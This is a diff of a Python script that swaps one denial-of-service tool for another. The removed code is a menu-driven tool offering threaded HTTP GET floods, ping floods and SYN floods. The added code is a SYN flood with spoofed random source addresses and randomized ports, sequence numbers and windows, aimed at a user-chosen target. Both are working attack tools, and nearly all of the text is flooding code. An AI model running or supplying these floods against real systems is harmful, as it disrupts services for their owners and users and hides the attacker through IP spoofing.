@@ -1,75 +1,61 @@
-import os
-from concurrent.futures import thread
-import socket
-import threading
-import time
-from scapy import *
-from scapy.layers.inet import IP, TCP, ICMP
-from scapy.packet import Raw
-from scapy.sendrecv import send
-from scapy.volatile import RandShort
-print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
-print("Use this tool only on your own website or websites from which you have obtained permission.")
-time.sleep(5)
-os.system("clear")
-os.system("toilet T-DoS")
-print("Coded By: ParzivalHack")
-print("Github: https://github.com/ParzivalHack")
-print("License: The source code of this tool is under the MIT License.")
-print("[Menu]")
-print("1) DDoS Attack)")
-print("2) Ping Flood Attack")
-print("3) SYN Flood Attack")
-fake_ip = '44.197.175.168'
-attack_num = 0
-options = int(input("Select Option: "))
+from os import system
+from sys import stdout
+from scapy.all import *
+from random import randint
 
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-
-        s.close()
-
-def send_syn(target_ip: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
-    ip = IP(dst=target_ip)
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-    raw = Raw(b"X" * size_of_packet)
-    p = ip / tcp / raw
-    send(p, count=number_of_packets_to_send, verbose=0)
-    print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip + ' on port ' + str(target_port))
+def randomIP():
+	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
+	return ip
 
 
-def send_ping(target_ip2: str, number_of_packets_to_send2: int = 4, size_of_packet2: int = 65000):
-    ip = IP(dst=target_ip2)
-    icmp = ICMP()
-    size_of_packet2 = 1024
-    raw = Raw(b"X" * size_of_packet2)
-    p = ip / icmp / raw
-    send(p, count=number_of_packets_to_send2, verbose=0)
-    print('send_ping(): Sent ' + str(number_of_packets_to_send2) + ' pings of ' + str(size_of_packet2) + ' size to ' + target_ip2)
+def randInt():
+	x = randint(1000,9000)
+	return x
 
-if options == 1:
-    target = str(input("Insert Target IP or Website: "))
-    port = int(input("Insert Target Port: "))
-    Trd = int(input("Insert Threads: "))
-    for i in range(Trd):
-            thread = threading.Thread(target = attack)
-            thread.start()
 
-elif options == 2:
-    target_ip2 = str(input("Insert Target IP or Website: "))
-    number_of_packets_to_send2 = int(input("Insert Number of Packets to send: ")) 
-    send_ping(target_ip2, number_of_packets_to_send2)
+def SYN_Flood(dstIP,dstPort,counter):
+	total = 0
+	print ("Packets are sending ...")
 
-elif options == 3:
-    target_ip = str(input("Insert Target IP or Website: "))
-    port2 = int(input("Insert Target Port (443 suggested): "))
-    number_of_packets_to_send = int(input("Insert Number of Packets to send: "))
-    send_syn(target_ip, port2, number_of_packets_to_send)
+	for x in range (0,counter):
+		s_port = randInt()
+		s_eq = randInt()
+		w_indow = randInt()
+
+		IP_Packet = IP ()
+		IP_Packet.src = randomIP()
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP ()
+		TCP_Packet.sport = s_port
+		TCP_Packet.dport = dstPort
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = s_eq
+		TCP_Packet.window = w_indow
+
+		send(IP_Packet/TCP_Packet, verbose=0)
+		total+=1
+
+	stdout.write("\nTotal packets sent: %i\n" % total)
+
+
+def info():
+	system("clear")
+	print ("#####################################")
+	print ("#        github.com/EmreOvunc       #")
+	print ("#####################################")
+	print ("# Welcome to Python3 SYN Flood Tool #")
+	print ("#####################################")
+
+	dstIP = input ("\nTarget IP : ")
+	dstPort = input ("Target Port : ")
+
+	return dstIP,int(dstPort)
+
+
+def main():
+	dstIP,dstPort = info()
+	counter = input ("How many packets do you want to send : ")
+	SYN_Flood(dstIP,dstPort,int(counter))
+
+main()
